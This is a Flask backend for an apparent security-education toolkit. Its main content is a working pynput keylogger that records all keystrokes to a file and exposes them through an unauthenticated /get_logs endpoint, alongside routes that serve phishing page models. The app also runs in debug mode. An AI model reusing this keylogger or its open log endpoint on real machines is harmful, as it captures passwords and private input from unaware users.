from flask import Flask, request, jsonify, send_file, render_template, send_from_directory
import os
from pynput.keyboard import Listener, Key
import threading
import time
from datetime import datetime

app = Flask(__name__, 
    static_url_path='/static',
    static_folder='static',
    template_folder='templates')

# Global variables
is_running = False
count = 0
keys = []
last_key_time = None
log_file = "keylogger_logs.txt"
log_lock = threading.Lock()

def write_to_log(keys):
    with log_lock:
        with open(log_file, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(" ")
                elif k.find("Key") == -1:
                    f.write("[" + k + "]")

def on_press(key):
    global keys, count, last_key_time, is_running
    if not is_running:
        return
    
    current_time = time.time()
    
    if last_key_time is not None and (current_time - last_key_time) >= 4:
        with open(log_file, "a") as f:
            f.write("\n[" + str(datetime.now())[:19] + "] ")
    
    last_key_time = current_time
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_to_log(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/keylogger')
def keylogger():
    return render_template('keylogger.html')

@app.route('/steganography')
def steganography():
    return render_template('steganography.html')

@app.route('/pass-manager')
def pass_manager():
    return render_template('pass-manager.html')

@app.route('/pass-generator')
def pass_generator():
    return render_template('pass-generator.html')

@app.route('/malware-detector')
def malware_detector():
    return render_template('malware-detector.html')

@app.route('/quiz')
def quiz():
    return render_template('quiz.html')

@app.route('/developers')
def developers():
    return render_template('developers.html')

@app.route('/contact')
def contact():
    return render_template('contact.html')

@app.route('/news')
def news():
    return render_template('news.html')

@app.route('/phishing-simulator')
def phishing_simulator():
    return render_template('phishing-simulator.html')

@app.route('/start_keylogger', methods=['POST'])
def start_keylogger():
    global is_running, listener
    if not is_running:
        is_running = True
        with open(log_file, "a") as f:
            f.write("Keylogger Started at " + (str(datetime.now()))[:+7] + "\n")
        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()
        return jsonify({"status": "success", "message": "Keylogger started"})
    return jsonify({"status": "error", "message": "Keylogger is already running"})

@app.route('/stop_keylogger', methods=['POST'])
def stop_keylogger():
    global is_running, listener
    if is_running:
        is_running = False
        listener.stop()
        with open(log_file, "a") as f:
            f.write("\nKeylogger Ended at " + (str(datetime.now()))[:+7] + "\n")
            f.write("-----------------------------------------------------------------------------\n")
        return jsonify({"status": "success", "message": "Keylogger stopped"})
    return jsonify({"status": "error", "message": "Keylogger is not running"})

@app.route('/get_logs', methods=['GET'])
def get_logs():
    try:
        with open(log_file, "r") as f:
            logs = f.read()
        return jsonify({"status": "success", "logs": logs})
    except FileNotFoundError:
        return jsonify({"status": "error", "message": "No logs found"})

@app.route('/clear_logs', methods=['POST'])
def clear_logs():
    try:
        with open(log_file, "w") as f:
            f.write("")
        return jsonify({"status": "success", "message": "Logs cleared"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/tools/phishingmodels/<path:filename>')
def serve_phishing_models(filename):
    return send_from_directory('tools/phishingmodels', filename)

@app.route('/tools/phishingmodels/css/<path:filename>')
def serve_phishing_css(filename):
    return send_from_directory('tools/phishingmodels', filename, mimetype='text/css')

@app.route('/tools/phishingmodels/js/<path:filename>')
def serve_phishing_js(filename):
    return send_from_directory('tools/phishingmodels', filename, mimetype='application/javascript')

if __name__ == '__main__':
    # Create log file if it doesn't exist
    if not os.path.exists(log_file):
        with open(log_file, "w") as f:
            f.write("")
    
    # Enable CORS for development
    app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0
    app.run(debug=True, port=5000) 